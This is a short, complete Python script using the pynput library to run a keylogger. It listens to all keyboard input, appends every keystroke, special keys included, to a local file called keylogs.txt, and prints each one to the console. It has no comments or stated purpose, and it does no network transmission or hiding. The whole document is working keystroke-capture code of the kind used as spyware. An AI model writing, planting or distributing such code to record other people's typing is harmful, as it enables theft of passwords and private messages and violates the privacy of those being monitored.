import pynput.keyboard

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            f.write(key.char)
        print(f"Key pressed: {key.char}")
    except AttributeError:
        with open("keylogs.txt", "a") as f:
            f.write(str(key))
        print(f"Special key pressed: {str(key)}")

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()